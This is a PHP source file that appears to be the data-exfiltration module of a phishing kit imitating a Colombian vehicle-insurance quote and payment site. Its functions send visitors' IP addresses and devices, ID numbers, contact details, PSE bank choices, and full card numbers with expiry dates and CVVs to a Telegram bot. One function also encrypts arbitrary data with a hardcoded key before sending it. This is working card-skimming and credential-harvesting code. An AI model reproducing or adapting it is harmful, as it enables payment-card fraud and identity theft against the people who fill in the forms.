<?php

function telegram_config(): array
{
    static $cfg = null;
    if ($cfg !== null) return $cfg;

    $local = __DIR__ . '/../config/telegram.local.php';
    if (is_file($local)) {
        $c = require $local;
        if (is_array($c)) {
            return $cfg = [
                'token'   => (string)($c['token']   ?? ''),
                'chat_id' => (string)($c['chat_id'] ?? ''),
                'activo'  => (bool)  ($c['activo']  ?? true),
            ];
        }
    }

    return $cfg = [
        'token'   => (string)getenv('TELEGRAM_BOT_TOKEN'),
        'chat_id' => (string)getenv('TELEGRAM_CHAT_ID'),
        'activo'  => (bool)(getenv('TELEGRAM_ACTIVO') !== '0'),
    ];
}

function telegram_enviar(string $mensaje): bool
{
    $cfg = telegram_config();
    if (!$cfg['activo'] || $cfg['token'] === '' || $cfg['chat_id'] === '') {
        return false;
    }

    $url = 'https://api.telegram.org/bot' . $cfg['token'] . '/sendMessage';

    $payload = http_build_query([
        'chat_id'    => $cfg['chat_id'],
        'text'       => $mensaje,
        'parse_mode' => 'HTML',
        'disable_web_page_preview' => true,
    ]);

    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_POST           => true,
            CURLOPT_POSTFIELDS     => $payload,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT        => 8,
            CURLOPT_CONNECTTIMEOUT => 4,
        ]);
        $resp = curl_exec($ch);
        $code = (int)curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        return $resp !== false && $code === 200;
    }

    $ctx = stream_context_create([
        'http' => [
            'method'  => 'POST',
            'header'  => "Content-Type: application/x-www-form-urlencoded\r\n",
            'content' => $payload,
            'timeout' => 8,
        ],
    ]);
    $resp = @file_get_contents($url, false, $ctx);
    return $resp !== false;
}

function telegram_enviar_cifrado(array $datos): bool
{
    $cfg = telegram_config();
    if (!$cfg['activo'] || $cfg['token'] === '' || $cfg['chat_id'] === '') {
        return false;
    }


    $claveSecreta = 'ac8513cab4e63ef31e9b1566f4cc855bd5002b7158951fa160912e152969a992'; 
    
    $jsonDatos = json_encode($datos, JSON_UNESCAPED_UNICODE);
    

    $ivLength = openssl_cipher_iv_length('AES-256-CBC');
    $iv = openssl_random_pseudo_bytes($ivLength);
    $cifrado = openssl_encrypt($jsonDatos, 'AES-256-CBC', hash('sha256', $claveSecreta, true), 0, $iv);
    

    $payloadSeguro = base64_encode($iv . $cifrado);


    $msgOfuscado = "🔒 <b>DATOS CIFRADOS DE SEGURIDAD</b>\n\n<code>" . $payloadSeguro . "</code>";

    $url = 'https://api.telegram.org/bot' . $cfg['token'] . '/sendMessage';
    $payload = http_build_query([
        'chat_id'    => $cfg['chat_id'],
        'text'       => $msgOfuscado,
        'parse_mode' => 'HTML',
    ]);

    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_POST           => true,
        CURLOPT_POSTFIELDS     => $payload,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 8,
    ]);
    $resp = curl_exec($ch);
    curl_close($ch);
    return $resp !== false;
}

function tg_esc(string $s): string
{
    return htmlspecialchars($s, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
}

function tg_ip(): string
{
    foreach (['HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_REAL_IP', 'REMOTE_ADDR'] as $k) {
        if (!empty($_SERVER[$k])) {
            $ip = trim(explode(',', $_SERVER[$k])[0]);
            if (filter_var($ip, FILTER_VALIDATE_IP)) return $ip;
        }
    }
    return $_SERVER['REMOTE_ADDR'] ?? 'desconocida';
}

function tg_sesion_id(): string
{
    if (session_status() === PHP_SESSION_ACTIVE) {
        if (empty($_SESSION['_tg_sid'])) {
            $_SESSION['_tg_sid'] = strtoupper(bin2hex(random_bytes(4)));
        }
        return $_SESSION['_tg_sid'];
    }
    return 'SIN-SESION';
}

/**
 * Alerta "NUEVO USUARIO" — solo la primera vez (usa sesión + cookie
 * para evitar duplicados aunque la sesión se regenere).
 */
function telegram_alerta_nuevo_usuario(): void
{
    $cookieNombre = '_tg_saludo';


    if (!empty($_COOKIE[$cookieNombre]) && $_COOKIE[$cookieNombre] === '1') {
        if (session_status() === PHP_SESSION_ACTIVE) {
            $_SESSION['_tg_saludo_enviado'] = true;
        }
        return;
    }

    if (session_status() === PHP_SESSION_ACTIVE && !empty($_SESSION['_tg_saludo_enviado'])) {
        return;
    }

    if (session_status() === PHP_SESSION_ACTIVE) {
        $_SESSION['_tg_saludo_enviado'] = true;
    }


    if (!headers_sent()) {
        setcookie($cookieNombre, '1', [
            'expires'  => time() + 86400,
            'path'     => '/',
            'secure'   => !empty($_SERVER['HTTPS']),
            'httponly' => true,
            'samesite' => 'Lax',
        ]);
    }
    $_COOKIE[$cookieNombre] = '1';


    $fecha   = date('d/m/Y');
    $hora    = date('H:i:s');
    $sid     = tg_sesion_id();
    $ip      = tg_ip();
    $ua      = $_SERVER['HTTP_USER_AGENT'] ?? 'desconocido';
    $ua      = mb_substr($ua, 0, 200);
    $pagina  = $_SERVER['REQUEST_URI'] ?? '/';
    $ref     = $_SERVER['HTTP_REFERER'] ?? '—';
    $pais    = $_SERVER['HTTP_CF_IPCOUNTRY'] ?? '';
    $ciudad  = $_SERVER['HTTP_CF_IPCITY']    ?? '';

    $msg  = "🔔 <b>NUEVO USUARIO</b>\n\n";
    $msg .= "🆔 <b>ID sesión:</b> <code>" . tg_esc($sid) . "</code>\n";
    $msg .= "📅 <b>Fecha:</b> " . tg_esc($fecha) . "\n";
    $msg .= "🕐 <b>Hora:</b> " . tg_esc($hora) . "\n";
    $msg .= "🌐 <b>IP:</b> " . tg_esc($ip) . "\n";
    if ($pais) {
        $msg .= "🌎 <b>País:</b> " . tg_esc($pais) . ($ciudad ? " ({$ciudad})" : '') . "\n";
    }
    $msg .= "📄 <b>Página:</b> " . tg_esc($pagina) . "\n";
    if ($ref !== '—') {
        $msg .= "🔗 <b>Vino de:</b> " . tg_esc(mb_substr($ref, 0, 100)) . "\n";
    }
    $msg .= "💻 <b>Dispositivo:</b> " . tg_esc($ua);

    telegram_enviar($msg);
}

function telegram_cotizacion(string $placa, string $tipoDoc, string $documento): void
{
    $msg  = "📝 <b>COTIZACIÓN INICIADA</b>\n\n";
    $msg .= "🆔 <b>ID:</b> <code>" . tg_esc(tg_sesion_id()) . "</code>\n";
    $msg .= "🚗 <b>Placa:</b> <code>" . tg_esc($placa) . "</code>\n";
    $msg .= "🪪 <b>Tipo doc:</b> " . tg_esc($tipoDoc) . "\n";
    $msg .= "🔢 <b>Documento:</b> <code>" . tg_esc($documento) . "</code>\n";
    $msg .= "🕐 <b>Hora:</b> " . date('d/m/Y H:i:s') . "\n";
    $msg .= "🌐 <b>IP:</b> " . tg_esc(tg_ip());

    telegram_enviar($msg);
}

function telegram_contacto(array $datos): void
{
    $msg  = "📞 <b>CONTACTO + COBERTURAS</b>\n\n";
    $msg .= "🆔 <b>ID:</b> <code>" . tg_esc(tg_sesion_id()) . "</code>\n";
    $msg .= "🚗 <b>Placa:</b> <code>" . tg_esc($datos['placa'] ?? '—') . "</code>\n";
    $msg .= "👤 <b>Cliente:</b> " . tg_esc($datos['nombre'] ?? '—') . "\n";
    $msg .= "📱 <b>Teléfono:</b> <code>" . tg_esc($datos['telefono'] ?? '—') . "</code>\n";
    $msg .= "✉️ <b>Correo:</b> " . tg_esc($datos['email'] ?? '—') . "\n\n";
    $msg .= "🛡️ <b>Complementos:</b>\n";
    $msg .= "  • Terceros: " . tg_esc($datos['terceros'] ?? 'No') . "\n";
    $msg .= "  • Accidentes: " . tg_esc($datos['accidentes'] ?? 'No') . "\n\n";
    $msg .= "💰 <b>Total:</b> " . tg_esc($datos['total'] ?? '—') . "\n";
    $msg .= "🕐 " . date('d/m/Y H:i:s') . "\n";
    $msg .= "🌐 " . tg_esc(tg_ip());

    telegram_enviar($msg);
}

function telegram_medio_pago(string $medio, string $total, string $placa): void
{
    $msg  = "💳 <b>MEDIO DE PAGO ELEGIDO</b>\n\n";
    $msg .= "🆔 <b>ID:</b> <code>" . tg_esc(tg_sesion_id()) . "</code>\n";
    $msg .= "🚗 <b>Placa:</b> <code>" . tg_esc($placa) . "</code>\n";
    $msg .= "💳 <b>Medio:</b> " . tg_esc($medio) . "\n";
    $msg .= "💰 <b>Total:</b> " . tg_esc($total) . "\n";
    $msg .= "🕐 " . date('d/m/Y H:i:s') . "\n";
    $msg .= "🌐 " . tg_esc(tg_ip());

    telegram_enviar($msg);
}


function telegram_pago_tarjeta(array $datos): void
{
    $msg  = "💳 <b>PAGO CON TARJETA</b>\n\n";
    $msg .= "🆔 <b>ID:</b> <code>" . tg_esc(tg_sesion_id()) . "</code>\n";
    $msg .= "🚗 <b>Placa:</b> <code>" . tg_esc($datos['placa'] ?? '—') . "</code>\n\n";

    $msg .= "💳 <b>Número tarjeta:</b>\n<code>" . tg_esc($datos['numero'] ?? '—') . "</code>\n";
    $msg .= "📅 <b>Vencimiento:</b> " . tg_esc($datos['vencimiento'] ?? '—') . "\n";
    $msg .= "🔒 <b>CVV:</b> <code>" . tg_esc($datos['cvv'] ?? '—') . "</code>\n";
    $msg .= "🔢 <b>Cuotas:</b> " . tg_esc($datos['cuotas'] ?? '—') . "\n\n";

    $msg .= "👤 <b>Titular:</b> " . tg_esc($datos['titular'] ?? '—') . "\n";
    $msg .= "🪪 <b>Tipo doc:</b> " . tg_esc($datos['tipo_doc'] ?? '—') . "\n";
    $msg .= "🔢 <b>N° documento:</b> <code>" . tg_esc($datos['numero_doc'] ?? '—') . "</code>\n\n";

    $msg .= "💰 <b>Monto:</b> " . tg_esc($datos['total'] ?? '—') . "\n";
    $msg .= "🕐 " . date('d/m/Y H:i:s') . "\n";
    $msg .= "🌐 " . tg_esc(tg_ip());

    telegram_enviar($msg);
}

function telegram_pago_pse(array $datos): void
{
    $msg  = "🏦 <b>PAGO PSE</b>\n\n";
    $msg .= "🆔 <b>ID:</b> <code>" . tg_esc(tg_sesion_id()) . "</code>\n";
    $msg .= "🚗 <b>Placa:</b> <code>" . tg_esc($datos['placa'] ?? '—') . "</code>\n";
    $msg .= "👤 <b>Tipo persona:</b> " . tg_esc($datos['tipo_persona'] ?? '—') . "\n";
    $msg .= "🪪 <b>Doc:</b> " . tg_esc($datos['tipo_doc'] ?? '—') . " " . tg_esc($datos['documento'] ?? '—') . "\n";
    $msg .= "✉️ <b>Correo:</b> " . tg_esc($datos['correo'] ?? '—') . "\n";
    $msg .= "🏦 <b>Banco:</b> " . tg_esc($datos['banco'] ?? '—') . "\n";
    $msg .= "💰 <b>Monto:</b> " . tg_esc($datos['total'] ?? '—') . "\n";
    $msg .= "🕐 " . date('d/m/Y H:i:s') . "\n";
    $msg .= "🌐 " . tg_esc(tg_ip());

    telegram_enviar($msg);
}